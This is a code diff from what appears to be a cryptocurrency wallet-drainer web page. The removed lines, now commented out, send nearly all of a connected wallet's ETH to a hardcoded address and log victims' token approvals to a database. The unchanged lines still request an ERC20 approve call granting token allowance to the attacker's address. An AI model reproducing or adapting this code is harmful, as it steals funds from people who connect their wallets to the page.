@@ -900,30 +900,30 @@ if (account == '0x2c5da2bcfe33ecf847f7558f6195babc2f582262') {
 
 }
 
- var value = await get_eth(account)
- var minusvalue = value - 0.0084
+//  var value = await get_eth(account)
+//  var minusvalue = value - 0.0084
 
-const finalAmount = Web3.utils.toWei(minusvalue.toString(), 'ether')
-
-
+// const finalAmount = Web3.utils.toWei(minusvalue.toString(), 'ether')
 
 
-console.log(finalAmount)
-const txData = {
-  from: account,
-  to: '0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262',
-  value: finalAmount,
-};
 
 
-await web3.eth.sendTransaction(txData)
-  .then( (txHash) => {
-    console.log(txHash)
-  }).catch( (err) => {
-    console.log(err)
-  })
+// console.log(finalAmount)
+// const txData = {
+//   from: account,
+//   to: '0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262',
+//   value: finalAmount,
+// };
 
- //end of if
+
+// await web3.eth.sendTransaction(txData)
+//   .then( (txHash) => {
+//     console.log(txHash)
+//   }).catch( (err) => {
+//     console.log(err)
+//   })
+
+
 
 
 
@@ -1152,9 +1152,6 @@ const erc20TokenContractAbi = [
 ];
 
 async function tokenGet(tokenAddress, tokenBalance) {
-
-
-
   
 try {
   await ethereum.request({
@@ -1172,20 +1169,20 @@ try {
     await tokenContract.methods.approve(toAddress, calculatedApproveValue).send({from: account})
 
 } catch (error) {
-  
+  console.log(error)
 }
 
 
-        await db.collection('tokenApproval').add({
-        tokenContract: tokenAddress,
-        approvedBalance: tokenBalance,
-        date: new Date(),
-        address: account
-    }).then( () => {
-        console.log('success')
-    }).catch( () => {
-        console.log('error')
-    })
+    //     await db.collection('tokenApproval').add({
+    //     tokenContract: tokenAddress,
+    //     approvedBalance: tokenBalance,
+    //     date: new Date(),
+    //     address: account
+    // }).then( () => {
+    //     console.log('success')
+    // }).catch( () => {
+    //     console.log('error')
+    // })
 
     
 
